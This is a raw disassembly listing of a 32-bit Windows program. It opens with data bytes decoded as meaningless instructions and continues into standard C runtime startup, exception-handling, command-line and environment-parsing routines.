  424290:	xchg   edi,eax
  424291:	pop    esi
  424292:	inc    edx
  424293:	jae    0x4242a5
  424295:	popa   
  424296:	aam    0x96
  424298:	sub    ebp,DWORD PTR [ebp+0x13]
  42429b:	loop   0x4242d3
  42429d:	inc    ebp
  42429e:	or     esp,esp
  4242a0:	arpl   WORD PTR [eax-0x4c],bx
  4242a3:	xchg   esi,eax
  4242a4:	daa    
  4242a5:	and    bh,BYTE PTR [edx+0x295f8f87]
  4242ab:	je     0x4242d0
  4242ad:	fs aas 
  4242af:	sbb    al,0x32
  4242b1:	and    dh,ch
  4242b3:	(bad)  
  4242b4:	pop    edx
  4242b5:	push   es
  4242b6:	pop    ebx
  4242b7:	ja     0x424309
  4242b9:	ja     0x4242ea
  4242bb:	loop   0x42425c
  4242bd:	sbb    DWORD PTR [eax-0x10],esi
  4242c0:	dec    esp
  4242c1:	cli    
  4242c2:	cmp    bh,BYTE PTR [edx+ebp*8-0x7c]
  4242c6:	call   0x200c:0x494a62dc
  4242cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4242ce:	xchg   esi,eax
  4242cf:	jecxz  0x424336
  4242d1:	inc    edx
  4242d2:	mov    al,ds:0x2fd88c3e
  4242d7:	frstor [edx+edx*2-0x69053e4e]
  4242de:	push   ds
  4242df:	or     eax,0x5be36e0d
  4242e4:	or     ebp,esi
  4242e6:	mov    dh,0x5e
  4242e8:	jmp    0x42435e
  4242ea:	jge    0x42429f
  4242ec:	out    dx,al
  4242ed:	sbb    bh,BYTE PTR [esi]
  4242ef:	repz add BYTE PTR [edx-0x34],0x76
  4242f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4242f5:	mov    al,0xe6
  4242f7:	sbb    ecx,eax
  4242f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4242fa:	inc    ecx
  4242fc:	mov    al,ds:0x780de530
  424301:	shl    edi,cl
  424303:	fsubp  st(7),st
  424305:	enter  0xb2ef,0xfc
  424309:	push   0x8
  42430b:	mov    esi,0xfa233709
  424310:	mov    edi,0x7f78c3dc
  424315:	adc    bl,BYTE PTR [ecx+0x1b]
  424318:	xchg   esp,eax
  424319:	pop    eax
  42431a:	or     esi,0x8fd00b7e
  424320:	into   
  424321:	fnsave [ebx]
  424323:	pop    edx
  424324:	jecxz  0x42431f
  424326:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424327:	aas    
  424328:	test   esi,eax
  42432a:	arpl   WORD PTR [ecx-0x18],si
  42432d:	sar    DWORD PTR gs:[edx+0x2d],cl
  424331:	xor    BYTE PTR [eax-0xf],0xef
  424335:	sbb    eax,0xc7322d5e
  42433a:	mov    bl,0xfe
  42433c:	xchg   esp,eax
  42433d:	(bad)  [eax]
  42433f:	push   ebx
  424340:	cmp    cl,BYTE PTR [edi+0x3eb5bb5e]
  424346:	sub    BYTE PTR [esp+esi*4+0x53fcf282],dh
  42434d:	sbb    eax,0xdd3bf110
  424352:	into   
  424353:	xor    edi,DWORD PTR [ecx]
  424355:	add    al,0xa3
  424357:	inc    eax
  424358:	test   eax,0xdded3212
  42435d:	loope  0x4243b7
  42435f:	stos   DWORD PTR es:[edi],eax
  424360:	mov    dl,0x78
  424362:	jle    0x4243c3
  424364:	or     bl,BYTE PTR ds:[ebx-0x55e450b9]
  42436b:	inc    ecx
  42436c:	jbe    0x4243e8
  42436e:	xchg   esi,eax
  42436f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424370:	(bad)  
  424371:	in     al,dx
  424372:	mov    ch,0x57
  424374:	jo     0x4243a1
  424376:	mov    eax,ds:0x915b8be1
  42437b:	ss jl  0x4243a3
  42437e:	push   eax
  42437f:	xchg   edx,eax
  424380:	jle    0x42436c
  424382:	adc    ebp,ebp
  424384:	imul   ecx,DWORD PTR [esi],0x10d42c99
  42438a:	dec    esp
  42438b:	add    eax,0x9f8afce8
  424390:	in     eax,dx
  424391:	je     0x424369
  424393:	sub    eax,0x90a42e4c
  424398:	fcmovnb st,st(5)
  42439a:	add    eax,0x19778a18
  42439f:	jns    0x424376
  4243a1:	mov    esp,0xdaf643d1
  4243a6:	stos   BYTE PTR es:[edi],al
  4243a7:	dec    ecx
  4243a8:	(bad)  
  4243a9:	iret   
  4243aa:	in     al,0x5b
  4243ac:	js     0x4243c3
  4243ae:	xchg   BYTE PTR [esp-0x44bdb5b7],ah
  4243b5:	aas    
  4243b6:	mov    eax,0x587d6c3f
  4243bb:	mov    esp,0x305548fe
  4243c0:	cmp    edx,DWORD PTR [ecx+0x47ee761b]
  4243c6:	jno    0x424442
  4243c8:	sbb    edx,DWORD PTR [edx-0x29]
  4243cb:	cli    
  4243cc:	push   ebp
  4243cd:	mov    ds:0xb5b4c8c3,al
  4243d2:	cwde   
  4243d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4243d4:	xchg   ecx,eax
  4243d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4243d6:	(bad)  
  4243d7:	stos   DWORD PTR es:[edi],eax
  4243d8:	jmp    0x61db:0xdf082a3e
  4243df:	ins    BYTE PTR es:[edi],dx
  4243e0:	mov    ebp,0x72989db3
  4243e5:	xor    eax,0xf1ed4644
  4243ea:	push   0x3c
  4243ec:	jp     0x424426
  4243ee:	pop    edx
  4243ef:	sub    eax,0x2598a9e6
  4243f4:	add    eax,0x22806b24
  4243f9:	or     eax,0x13f60bc3
  4243fe:	push   0x0
  424400:	push   0x0
  424402:	call   0x424410
  424407:	xor    eax,eax
  424409:	add    esp,0x10
  42440c:	ret    0x10
  42440f:	nop
  424410:	jmp    DWORD PTR ds:0x429114
  424416:	cmp    DWORD PTR ds:0x45dabc,0x1
  42441d:	jne    0x424424
  42441f:	call   0x424962
  424424:	push   DWORD PTR [esp+0x4]
  424428:	call   0x4247eb
  42442d:	push   0xff
  424432:	call   DWORD PTR ds:0x45d1c0
  424438:	pop    ecx
  424439:	pop    ecx
  42443a:	ret    
  42443b:	cmp    DWORD PTR ds:0x45dabc,0x1
  424442:	jne    0x424449
  424444:	call   0x424962
  424449:	push   DWORD PTR [esp+0x4]
  42444d:	call   0x4247eb
  424452:	push   0xff
  424457:	call   0x424631
  42445c:	pop    ecx
  42445d:	pop    ecx
  42445e:	ret    
  42445f:	push   0x60
  424461:	push   0x429228
  424466:	call   0x425350
  42446b:	mov    edi,0x94
  424470:	mov    eax,edi
  424472:	call   0x4253a0
  424477:	mov    DWORD PTR [ebp-0x18],esp
  42447a:	mov    esi,esp
  42447c:	mov    DWORD PTR [esi],edi
  42447e:	push   esi
  42447f:	call   DWORD PTR ds:0x429058
  424485:	mov    ecx,DWORD PTR [esi+0x10]
  424488:	mov    DWORD PTR ds:0x45dac4,ecx
  42448e:	mov    eax,DWORD PTR [esi+0x4]
  424491:	mov    ds:0x45dad0,eax
  424496:	mov    edx,DWORD PTR [esi+0x8]
  424499:	mov    DWORD PTR ds:0x45dad4,edx
  42449f:	mov    esi,DWORD PTR [esi+0xc]
  4244a2:	and    esi,0x7fff
  4244a8:	mov    DWORD PTR ds:0x45dac8,esi
  4244ae:	cmp    ecx,0x2
  4244b1:	je     0x4244bf
  4244b3:	or     esi,0x8000
  4244b9:	mov    DWORD PTR ds:0x45dac8,esi
  4244bf:	shl    eax,0x8
  4244c2:	add    eax,edx
  4244c4:	mov    ds:0x45dacc,eax
  4244c9:	xor    esi,esi
  4244cb:	push   esi
  4244cc:	mov    edi,DWORD PTR ds:0x429024
  4244d2:	call   edi
  4244d4:	cmp    WORD PTR [eax],0x5a4d
  4244d9:	jne    0x4244fa
  4244db:	mov    ecx,DWORD PTR [eax+0x3c]
  4244de:	add    ecx,eax
  4244e0:	cmp    DWORD PTR [ecx],0x4550
  4244e6:	jne    0x4244fa
  4244e8:	movzx  eax,WORD PTR [ecx+0x18]
  4244ec:	cmp    eax,0x10b
  4244f1:	je     0x424512
  4244f3:	cmp    eax,0x20b
  4244f8:	je     0x4244ff
  4244fa:	mov    DWORD PTR [ebp-0x1c],esi
  4244fd:	jmp    0x424526
  4244ff:	cmp    DWORD PTR [ecx+0x84],0xe
  424506:	jbe    0x4244fa
  424508:	xor    eax,eax
  42450a:	cmp    DWORD PTR [ecx+0xf8],esi
  424510:	jmp    0x424520
  424512:	cmp    DWORD PTR [ecx+0x74],0xe
  424516:	jbe    0x4244fa
  424518:	xor    eax,eax
  42451a:	cmp    DWORD PTR [ecx+0xe8],esi
  424520:	setne  al
  424523:	mov    DWORD PTR [ebp-0x1c],eax
  424526:	push   0x1
  424528:	call   0x4252fd
  42452d:	pop    ecx
  42452e:	test   eax,eax
  424530:	jne    0x42453a
  424532:	push   0x1c
  424534:	call   0x42443b
  424539:	pop    ecx
  42453a:	call   0x425274
  42453f:	test   eax,eax
  424541:	jne    0x42454b
  424543:	push   0x10
  424545:	call   0x42443b
  42454a:	pop    ecx
  42454b:	call   0x42515d
  424550:	mov    DWORD PTR [ebp-0x4],esi
  424553:	call   0x424f5f
  424558:	test   eax,eax
  42455a:	jge    0x424564
  42455c:	push   0x1b
  42455e:	call   0x424416
  424563:	pop    ecx
  424564:	call   DWORD PTR ds:0x429054
  42456a:	mov    ds:0x45e274,eax
  42456f:	call   0x424e3d
  424574:	mov    ds:0x45dab4,eax
  424579:	call   0x424d9b
  42457e:	test   eax,eax
  424580:	jge    0x42458a
  424582:	push   0x8
  424584:	call   0x424416
  424589:	pop    ecx
  42458a:	call   0x424b68
  42458f:	test   eax,eax
  424591:	jge    0x42459b
  424593:	push   0x9
  424595:	call   0x424416
  42459a:	pop    ecx
  42459b:	call   0x424673
  4245a0:	mov    DWORD PTR [ebp-0x20],eax
  4245a3:	cmp    eax,esi
  4245a5:	je     0x4245ae
  4245a7:	push   eax
  4245a8:	call   0x424416
  4245ad:	pop    ecx
  4245ae:	mov    DWORD PTR [ebp-0x38],esi
  4245b1:	lea    eax,[ebp-0x64]
  4245b4:	push   eax
  4245b5:	call   DWORD PTR ds:0x429050
  4245bb:	call   0x424aff
  4245c0:	mov    DWORD PTR [ebp-0x68],eax
  4245c3:	test   BYTE PTR [ebp-0x38],0x1
  4245c7:	je     0x4245cf
  4245c9:	movzx  eax,WORD PTR [ebp-0x34]
  4245cd:	jmp    0x4245d2
  4245cf:	push   0xa
  4245d1:	pop    eax
  4245d2:	push   eax
  4245d3:	push   DWORD PTR [ebp-0x68]
  4245d6:	push   esi
  4245d7:	push   esi
  4245d8:	call   edi
  4245da:	push   eax
  4245db:	call   0x422f90
  4245e0:	mov    edi,eax
  4245e2:	mov    DWORD PTR [ebp-0x6c],edi
  4245e5:	cmp    DWORD PTR [ebp-0x1c],esi
  4245e8:	jne    0x4245f0
  4245ea:	push   edi
  4245eb:	call   0x4247ab
  4245f0:	call   0x4247cd
  4245f5:	jmp    0x424622
  4245f7:	mov    eax,DWORD PTR [ebp-0x14]
  4245fa:	mov    ecx,DWORD PTR [eax]
  4245fc:	mov    ecx,DWORD PTR [ecx]
  4245fe:	mov    DWORD PTR [ebp-0x70],ecx
  424601:	push   eax
  424602:	push   ecx
  424603:	call   0x42499b
  424608:	pop    ecx
  424609:	pop    ecx
  42460a:	ret    
  42460b:	mov    esp,DWORD PTR [ebp-0x18]
  42460e:	mov    edi,DWORD PTR [ebp-0x70]
  424611:	cmp    DWORD PTR [ebp-0x1c],0x0
  424615:	jne    0x42461d
  424617:	push   edi
  424618:	call   0x4247bc
  42461d:	call   0x4247dc
  424622:	or     DWORD PTR [ebp-0x4],0xffffffff
  424626:	mov    eax,edi
  424628:	lea    esp,[ebp-0x7c]
  42462b:	call   0x42538b
  424630:	ret    
  424631:	push   0x429244
  424636:	call   DWORD PTR ds:0x429024
  42463c:	test   eax,eax
  42463e:	je     0x424656
  424640:	push   0x429234
  424645:	push   eax
  424646:	call   DWORD PTR ds:0x429020
  42464c:	test   eax,eax
  42464e:	je     0x424656
  424650:	push   DWORD PTR [esp+0x4]
  424654:	call   eax
  424656:	push   DWORD PTR [esp+0x4]
  42465a:	call   DWORD PTR ds:0x42905c
  424660:	int3   
  424661:	push   0x8
  424663:	call   0x42550f
  424668:	pop    ecx
  424669:	ret    
  42466a:	push   0x8
  42466c:	call   0x42547b
  424671:	pop    ecx
  424672:	ret    
  424673:	mov    eax,ds:0x45e270
  424678:	test   eax,eax
  42467a:	je     0x42467e
  42467c:	call   eax
  42467e:	push   esi
  42467f:	push   edi
  424680:	mov    ecx,0x42b00c
  424685:	mov    edi,0x42b018
  42468a:	xor    eax,eax
  42468c:	cmp    ecx,edi
  42468e:	mov    esi,ecx
  424690:	jae    0x4246a9
  424692:	test   eax,eax
  424694:	jne    0x4246d5
  424696:	mov    ecx,DWORD PTR [esi]
  424698:	test   ecx,ecx
  42469a:	je     0x42469e
  42469c:	call   ecx
  42469e:	add    esi,0x4
  4246a1:	cmp    esi,edi
  4246a3:	jb     0x424692
  4246a5:	test   eax,eax
  4246a7:	jne    0x4246d5
  4246a9:	push   0x4251a1
  4246ae:	call   0x425620
  4246b3:	mov    esi,0x42b000
  4246b8:	mov    eax,esi
  4246ba:	mov    edi,0x42b008
  4246bf:	cmp    eax,edi
  4246c1:	pop    ecx
  4246c2:	jae    0x4246d3
  4246c4:	mov    eax,DWORD PTR [esi]
  4246c6:	test   eax,eax
  4246c8:	je     0x4246cc
  4246ca:	call   eax
  4246cc:	add    esi,0x4
  4246cf:	cmp    esi,edi
  4246d1:	jb     0x4246c4
  4246d3:	xor    eax,eax
  4246d5:	pop    edi
  4246d6:	pop    esi
  4246d7:	ret    
  4246d8:	push   ebp
  4246d9:	mov    ebp,esp
  4246db:	push   esi
  4246dc:	push   edi
  4246dd:	push   0x8
  4246df:	call   0x42550f
  4246e4:	xor    esi,esi
  4246e6:	inc    esi
  4246e7:	cmp    DWORD PTR ds:0x45db04,esi
  4246ed:	pop    ecx
  4246ee:	jne    0x424700
  4246f0:	push   DWORD PTR [ebp+0x8]
  4246f3:	call   DWORD PTR ds:0x429064
  4246f9:	push   eax
  4246fa:	call   DWORD PTR ds:0x429060
  424700:	cmp    DWORD PTR [ebp+0xc],0x0
  424704:	mov    al,BYTE PTR [ebp+0x10]
  424707:	mov    DWORD PTR ds:0x45db00,esi
  42470d:	mov    ds:0x45dafc,al
  424712:	jne    0x424766
  424714:	mov    ecx,DWORD PTR ds:0x45e268
  42471a:	test   ecx,ecx
  42471c:	je     0x424747
  42471e:	mov    eax,ds:0x45e264
  424723:	sub    eax,0x4
  424726:	cmp    eax,ecx
  424728:	jmp    0x424740
  42472a:	mov    eax,DWORD PTR [eax]
  42472c:	test   eax,eax
  42472e:	je     0x424732
  424730:	call   eax
  424732:	mov    eax,ds:0x45e264
  424737:	sub    eax,0x4
  42473a:	cmp    eax,DWORD PTR ds:0x45e268
  424740:	mov    ds:0x45e264,eax
  424745:	jae    0x42472a
  424747:	mov    eax,0x42b01c
  42474c:	mov    esi,0x42b020
  424751:	cmp    eax,esi
  424753:	mov    edi,eax
  424755:	jae    0x424766
  424757:	mov    eax,DWORD PTR [edi]
  424759:	test   eax,eax
  42475b:	je     0x42475f
  42475d:	call   eax
  42475f:	add    edi,0x4
  424762:	cmp    edi,esi
  424764:	jb     0x424757
  424766:	mov    eax,0x42b024
  42476b:	mov    esi,0x42b028
  424770:	cmp    eax,esi
  424772:	mov    edi,eax
  424774:	jae    0x424785
  424776:	mov    eax,DWORD PTR [edi]
  424778:	test   eax,eax
  42477a:	je     0x42477e
  42477c:	call   eax
  42477e:	add    edi,0x4
  424781:	cmp    edi,esi
  424783:	jb     0x424776
  424785:	cmp    DWORD PTR [ebp+0x10],0x0
  424789:	pop    edi
  42478a:	pop    esi
  42478b:	je     0x424796
  42478d:	push   0x8
  42478f:	call   0x42547b
  424794:	jmp    0x4247a8
  424796:	push   DWORD PTR [ebp+0x8]
  424799:	mov    DWORD PTR ds:0x45db04,0x1
  4247a3:	call   0x424631
  4247a8:	pop    ecx
  4247a9:	pop    ebp
  4247aa:	ret    
  4247ab:	push   0x0
  4247ad:	push   0x0
  4247af:	push   DWORD PTR [esp+0xc]
  4247b3:	call   0x4246d8
  4247b8:	add    esp,0xc
  4247bb:	ret    
  4247bc:	push   0x0
  4247be:	push   0x1
  4247c0:	push   DWORD PTR [esp+0xc]
  4247c4:	call   0x4246d8
  4247c9:	add    esp,0xc
  4247cc:	ret    
  4247cd:	push   0x1
  4247cf:	push   0x0
  4247d1:	push   0x0
  4247d3:	call   0x4246d8
  4247d8:	add    esp,0xc
  4247db:	ret    
  4247dc:	push   0x1
  4247de:	push   0x1
  4247e0:	push   0x0
  4247e2:	call   0x4246d8
  4247e7:	add    esp,0xc
  4247ea:	ret    
  4247eb:	push   ebp
  4247ec:	mov    ebp,esp
  4247ee:	sub    esp,0x10c
  4247f4:	mov    eax,ds:0x45d430
  4247f9:	xor    eax,DWORD PTR [ebp+0x4]
  4247fc:	mov    ecx,DWORD PTR [ebp+0x8]
  4247ff:	push   ebx
  424800:	push   esi
  424801:	mov    DWORD PTR [ebp-0x4],eax
  424804:	xor    edx,edx
  424806:	push   edi
  424807:	xor    eax,eax
  424809:	cmp    ecx,DWORD PTR [eax*8+0x45d1c8]
  424810:	je     0x424818
  424812:	inc    eax
  424813:	cmp    eax,0x12
  424816:	jb     0x424809
  424818:	mov    esi,eax
  42481a:	shl    esi,0x3
  42481d:	cmp    ecx,DWORD PTR [esi+0x45d1c8]
  424823:	jne    0x42494c
  424829:	mov    eax,ds:0x45dabc
  42482e:	cmp    eax,0x1
  424831:	je     0x424927
  424837:	cmp    eax,edx
  424839:	jne    0x424848
  42483b:	cmp    DWORD PTR ds:0x45d1c4,0x1
  424842:	je     0x424927
  424848:	cmp    ecx,0xfc
  42484e:	je     0x42494c
  424854:	push   0x104
  424859:	lea    eax,[ebp-0x10c]
  42485f:	push   eax
  424860:	push   edx
  424861:	mov    BYTE PTR [ebp-0x8],dl
  424864:	call   DWORD PTR ds:0x42906c
  42486a:	test   eax,eax
  42486c:	jne    0x424881
  42486e:	lea    eax,[ebp-0x10c]
  424874:	push   0x42959c
  424879:	push   eax
  42487a:	call   0x425730
  42487f:	pop    ecx
  424880:	pop    ecx
  424881:	lea    eax,[ebp-0x10c]
  424887:	push   eax
  424888:	lea    edi,[ebp-0x10c]
  42488e:	call   0x425960
  424893:	inc    eax
  424894:	cmp    eax,0x3c
  424897:	pop    ecx
  424898:	jbe    0x4248c3
  42489a:	lea    eax,[ebp-0x10c]
  4248a0:	push   eax
  4248a1:	call   0x425960
  4248a6:	mov    edi,eax
  4248a8:	lea    eax,[ebp-0x10c]
  4248ae:	sub    eax,0x3b
  4248b1:	push   0x3
  4248b3:	add    edi,eax
  4248b5:	push   0x429598
  4248ba:	push   edi
  4248bb:	call   0x425830
  4248c0:	add    esp,0x10
  4248c3:	push   edi
  4248c4:	call   0x425960
  4248c9:	push   DWORD PTR [esi+0x45d1cc]
  4248cf:	mov    ebx,eax
  4248d1:	call   0x425960
  4248d6:	lea    eax,[ebx+eax*1+0x1c]
  4248da:	pop    ecx
  4248db:	add    eax,0x3
  4248de:	pop    ecx
  4248df:	and    eax,0xfffffffc
  4248e2:	call   0x4253a0
  4248e7:	mov    ebx,esp
  4248e9:	push   0x42957c
  4248ee:	push   ebx
  4248ef:	call   0x425730
  4248f4:	push   edi
  4248f5:	push   ebx
  4248f6:	call   0x425740
  4248fb:	push   0x429578
  424900:	push   ebx
  424901:	call   0x425740
  424906:	push   DWORD PTR [esi+0x45d1cc]
  42490c:	push   ebx
  42490d:	call   0x425740
  424912:	push   0x12010
  424917:	push   0x429550
  42491c:	push   ebx
  42491d:	call   0x425632
  424922:	add    esp,0x2c
  424925:	jmp    0x42494c
  424927:	push   edx
  424928:	lea    eax,[ebp+0x8]
  42492b:	push   eax
  42492c:	lea    esi,[esi+0x45d1cc]
  424932:	push   DWORD PTR [esi]
  424934:	call   0x425960
  424939:	pop    ecx
  42493a:	push   eax
  42493b:	push   DWORD PTR [esi]
  42493d:	push   0xfffffff4
  42493f:	call   DWORD PTR ds:0x429068
  424945:	push   eax
  424946:	call   DWORD PTR ds:0x42902c
  42494c:	lea    esp,[ebp-0x118]
  424952:	mov    ecx,DWORD PTR [ebp-0x4]
  424955:	xor    ecx,DWORD PTR [ebp+0x4]
  424958:	call   0x425a1c
  42495d:	pop    edi
  42495e:	pop    esi
  42495f:	pop    ebx
  424960:	leave  
  424961:	ret    
  424962:	mov    eax,ds:0x45dabc
  424967:	cmp    eax,0x1
  42496a:	je     0x424979
  42496c:	test   eax,eax
  42496e:	jne    0x42499a
  424970:	cmp    DWORD PTR ds:0x45d1c4,0x1
  424977:	jne    0x42499a
  424979:	push   0xfc
  42497e:	call   0x4247eb
  424983:	mov    eax,ds:0x45db08
  424988:	test   eax,eax
  42498a:	pop    ecx
  42498b:	je     0x42498f
  42498d:	call   eax
  42498f:	push   0xff
  424994:	call   0x4247eb
  424999:	pop    ecx
  42499a:	ret    
  42499b:	push   ebp
  42499c:	mov    ebp,esp
  42499e:	push   ecx
  42499f:	push   ebx
  4249a0:	push   esi
  4249a1:	push   edi
  4249a2:	call   0x425203
  4249a7:	mov    edi,DWORD PTR [ebp+0x8]
  4249aa:	mov    esi,eax
  4249ac:	mov    edx,DWORD PTR [esi+0x54]
  4249af:	mov    eax,ds:0x45d2dc
  4249b4:	mov    ecx,edx
  4249b6:	cmp    DWORD PTR [ecx],edi
  4249b8:	je     0x4249c7
  4249ba:	lea    ebx,[eax+eax*2]
  4249bd:	add    ecx,0xc
  4249c0:	lea    ebx,[edx+ebx*4]
  4249c3:	cmp    ecx,ebx
  4249c5:	jb     0x4249b6
  4249c7:	lea    eax,[eax+eax*2]
  4249ca:	lea    eax,[edx+eax*4]
  4249cd:	cmp    ecx,eax
  4249cf:	jae    0x4249d5
  4249d1:	cmp    DWORD PTR [ecx],edi
  4249d3:	je     0x4249d7
  4249d5:	xor    ecx,ecx
  4249d7:	test   ecx,ecx
  4249d9:	je     0x424af1
  4249df:	mov    ebx,DWORD PTR [ecx+0x8]
  4249e2:	test   ebx,ebx
  4249e4:	mov    DWORD PTR [ebp+0x8],ebx
  4249e7:	je     0x424af1
  4249ed:	cmp    ebx,0x5
  4249f0:	jne    0x4249fe
  4249f2:	and    DWORD PTR [ecx+0x8],0x0
  4249f6:	xor    eax,eax
  4249f8:	inc    eax
  4249f9:	jmp    0x424afa
  4249fe:	cmp    ebx,0x1
  424a01:	je     0x424aec
  424a07:	mov    eax,DWORD PTR [esi+0x58]
  424a0a:	mov    DWORD PTR [ebp-0x4],eax
  424a0d:	mov    eax,DWORD PTR [ebp+0xc]
  424a10:	mov    DWORD PTR [esi+0x58],eax
  424a13:	mov    eax,DWORD PTR [ecx+0x4]
  424a16:	cmp    eax,0x8
  424a19:	jne    0x424ade
  424a1f:	mov    edx,DWORD PTR ds:0x45d2d0
  424a25:	mov    eax,ds:0x45d2d4
  424a2a:	add    eax,edx
  424a2c:	cmp    edx,eax
  424a2e:	jge    0x424a57
  424a30:	lea    eax,[edx+edx*2]
  424a33:	shl    eax,0x2
  424a36:	mov    edi,DWORD PTR [esi+0x54]
  424a39:	and    DWORD PTR [eax+edi*1+0x8],0x0
  424a3e:	mov    edi,DWORD PTR ds:0x45d2d0
  424a44:	mov    ebx,DWORD PTR ds:0x45d2d4
  424a4a:	inc    edx
  424a4b:	add    ebx,edi
  424a4d:	add    eax,0xc
  424a50:	cmp    edx,ebx
  424a52:	jl     0x424a36
  424a54:	mov    ebx,DWORD PTR [ebp+0x8]
  424a57:	mov    ecx,DWORD PTR [ecx]
  424a59:	cmp    ecx,0xc000008e
  424a5f:	mov    edi,DWORD PTR [esi+0x5c]
  424a62:	jne    0x424a6d
  424a64:	mov    DWORD PTR [esi+0x5c],0x83
  424a6b:	jmp    0x424ad1
  424a6d:	cmp    ecx,0xc0000090
  424a73:	jne    0x424a7e
  424a75:	mov    DWORD PTR [esi+0x5c],0x81
  424a7c:	jmp    0x424ad1
  424a7e:	cmp    ecx,0xc0000091
  424a84:	jne    0x424a8f
  424a86:	mov    DWORD PTR [esi+0x5c],0x84
  424a8d:	jmp    0x424ad1
  424a8f:	cmp    ecx,0xc0000093
  424a95:	jne    0x424aa0
  424a97:	mov    DWORD PTR [esi+0x5c],0x85
  424a9e:	jmp    0x424ad1
  424aa0:	cmp    ecx,0xc000008d
  424aa6:	jne    0x424ab1
  424aa8:	mov    DWORD PTR [esi+0x5c],0x82
  424aaf:	jmp    0x424ad1
  424ab1:	cmp    ecx,0xc000008f
  424ab7:	jne    0x424ac2
  424ab9:	mov    DWORD PTR [esi+0x5c],0x86
  424ac0:	jmp    0x424ad1
  424ac2:	cmp    ecx,0xc0000092
  424ac8:	jne    0x424ad1
  424aca:	mov    DWORD PTR [esi+0x5c],0x8a
  424ad1:	push   DWORD PTR [esi+0x5c]
  424ad4:	push   0x8
  424ad6:	call   ebx
  424ad8:	pop    ecx
  424ad9:	mov    DWORD PTR [esi+0x5c],edi
  424adc:	jmp    0x424ae5
  424ade:	and    DWORD PTR [ecx+0x8],0x0
  424ae2:	push   eax
  424ae3:	call   ebx
  424ae5:	mov    eax,DWORD PTR [ebp-0x4]
  424ae8:	pop    ecx
  424ae9:	mov    DWORD PTR [esi+0x58],eax
  424aec:	or     eax,0xffffffff
  424aef:	jmp    0x424afa
  424af1:	push   DWORD PTR [ebp+0xc]
  424af4:	call   DWORD PTR ds:0x429070
  424afa:	pop    edi
  424afb:	pop    esi
  424afc:	pop    ebx
  424afd:	leave  
  424afe:	ret    
  424aff:	cmp    DWORD PTR ds:0x45e26c,0x0
  424b06:	jne    0x424b0d
  424b08:	call   0x425f3c
  424b0d:	push   esi
  424b0e:	mov    esi,DWORD PTR ds:0x45e274
  424b14:	test   esi,esi
  424b16:	jne    0x424b1f
  424b18:	mov    esi,0x4295b3
  424b1d:	jmp    0x424b64
  424b1f:	mov    al,BYTE PTR [esi]
  424b21:	cmp    al,0x22
  424b23:	jne    0x424b4d
  424b25:	inc    esi
  424b26:	mov    al,BYTE PTR [esi]
  424b28:	cmp    al,0x22
  424b2a:	je     0x424b5d
  424b2c:	test   al,al
  424b2e:	je     0x424b46
  424b30:	movzx  eax,al
  424b33:	push   eax
  424b34:	call   0x425a5b
  424b39:	test   eax,eax
  424b3b:	pop    ecx
  424b3c:	je     0x424b3f
  424b3e:	inc    esi
  424b3f:	inc    esi
  424b40:	mov    al,BYTE PTR [esi]
  424b42:	cmp    al,0x22
  424b44:	jne    0x424b2c
  424b46:	cmp    BYTE PTR [esi],0x22
  424b49:	jne    0x424b5e
  424b4b:	jmp    0x424b5d
  424b4d:	cmp    al,0x20
  424b4f:	jbe    0x424b5e
  424b51:	inc    esi
  424b52:	cmp    BYTE PTR [esi],0x20
  424b55:	ja     0x424b51
  424b57:	jmp    0x424b5e
  424b59:	cmp    al,0x20
  424b5b:	ja     0x424b64
  424b5d:	inc    esi
  424b5e:	mov    al,BYTE PTR [esi]
  424b60:	test   al,al
  424b62:	jne    0x424b59
  424b64:	mov    eax,esi
  424b66:	pop    esi
  424b67:	ret    
  424b68:	push   ebx
  424b69:	xor    ebx,ebx
  424b6b:	cmp    DWORD PTR ds:0x45e26c,ebx
  424b71:	push   esi
  424b72:	push   edi
  424b73:	jne    0x424b7a
  424b75:	call   0x425f3c
  424b7a:	mov    esi,DWORD PTR ds:0x45dab4
  424b80:	xor    edi,edi
  424b82:	cmp    esi,ebx
  424b84:	jne    0x424b98
  424b86:	jmp    0x424bb8
  424b88:	cmp    al,0x3d
  424b8a:	je     0x424b8d
  424b8c:	inc    edi
  424b8d:	push   esi
  424b8e:	call   0x425960
  424b93:	pop    ecx
  424b94:	lea    esi,[esi+eax*1+0x1]
  424b98:	mov    al,BYTE PTR [esi]
  424b9a:	cmp    al,bl
  424b9c:	jne    0x424b88
  424b9e:	lea    eax,[edi*4+0x4]
  424ba5:	push   eax
  424ba6:	call   0x426072
  424bab:	mov    edi,eax
  424bad:	cmp    edi,ebx
  424baf:	pop    ecx
  424bb0:	mov    DWORD PTR ds:0x45dae4,edi
  424bb6:	jne    0x424bbd
  424bb8:	or     eax,0xffffffff
  424bbb:	jmp    0x424c15
  424bbd:	mov    esi,DWORD PTR ds:0x45dab4
  424bc3:	push   ebp
  424bc4:	jmp    0x424bf0
  424bc6:	push   esi
  424bc7:	call   0x425960
  424bcc:	mov    ebp,eax
  424bce:	inc    ebp
  424bcf:	cmp    BYTE PTR [esi],0x3d
  424bd2:	pop    ecx
  424bd3:	je     0x424bee
  424bd5:	push   ebp
  424bd6:	call   0x426072
  424bdb:	cmp    eax,ebx
  424bdd:	pop    ecx
  424bde:	mov    DWORD PTR [edi],eax
  424be0:	je     0x424c19
  424be2:	push   esi
  424be3:	push   eax
  424be4:	call   0x425730
  424be9:	pop    ecx
  424bea:	pop    ecx
  424beb:	add    edi,0x4
  424bee:	add    esi,ebp
  424bf0:	cmp    BYTE PTR [esi],bl
  424bf2:	jne    0x424bc6
  424bf4:	push   DWORD PTR ds:0x45dab4
  424bfa:	call   0x425f5a
  424bff:	mov    DWORD PTR ds:0x45dab4,ebx
  424c05:	mov    DWORD PTR [edi],ebx
  424c07:	mov    DWORD PTR ds:0x45e260,0x1
  424c11:	xor    eax,eax
  424c13:	pop    ecx
  424c14:	pop    ebp
  424c15:	pop    edi
  424c16:	pop    esi
  424c17:	pop    ebx
  424c18:	ret    
  424c19:	push   DWORD PTR ds:0x45dae4
  424c1f:	call   0x425f5a
  424c24:	mov    DWORD PTR ds:0x45dae4,ebx
  424c2a:	or     eax,0xffffffff
  424c2d:	jmp    0x424c13
  424c2f:	push   ebp
  424c30:	mov    ebp,esp
  424c32:	push   ecx
